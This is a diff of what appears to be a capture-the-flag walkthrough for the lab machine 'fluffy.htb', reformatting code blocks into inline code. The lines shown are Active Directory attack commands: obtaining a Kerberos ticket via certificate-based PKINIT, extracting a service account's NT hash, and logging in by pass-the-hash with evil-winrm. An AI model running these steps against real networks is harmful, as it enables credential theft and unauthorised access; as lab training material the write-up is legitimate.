@@ -94,12 +94,8 @@ If your local time does not match the Domain Controller (DC), you may encounter 
 `sudo rdate -n <TARGET_IP>`
 
 
-```bash
-faketime '<DATE_TIME>' python3 gettgtpkinit.py \
-  -cert-pem key_cert.pem \
-  -key-pem key_priv.pem \
-  fluffy.htb/<SERVICE_ACCOUNT> \
-  <SERVICE_ACCOUNT>.ccache
+
+`faketime <DATE_TIME> python3 gettgtpkinit.py \ -cert-pem key_cert.pem \ -key-pem key_priv.pem \ fluffy.htb/<SERVICE_ACCOUNT> \  <SERVICE_ACCOUNT>.ccache`
 
 
 ### Set the Kerberos ticket environment variable:
@@ -111,9 +107,7 @@ Tip: Ensure the KRB5CCNAME export works in your virtual environment. Use an abso
 
 ### Retrieve NT Hash
 
-```bash 
-faketime '<DATE_TIME>' python3 getnthash.py \
-  -key <KEY> fluffy.htb/<SERVICE_ACCOUNT> ``` </pre>
+`faketime <DATE_TIME> python3 getnthash.py \ -key <KEY> fluffy.htb/<SERVICE_ACCOUNT>`
 
 ### Access Service Account
 `evil-winrm -i <TARGET_IP> -u <SERVICE_ACCOUNT> -H <NT_HASH>`
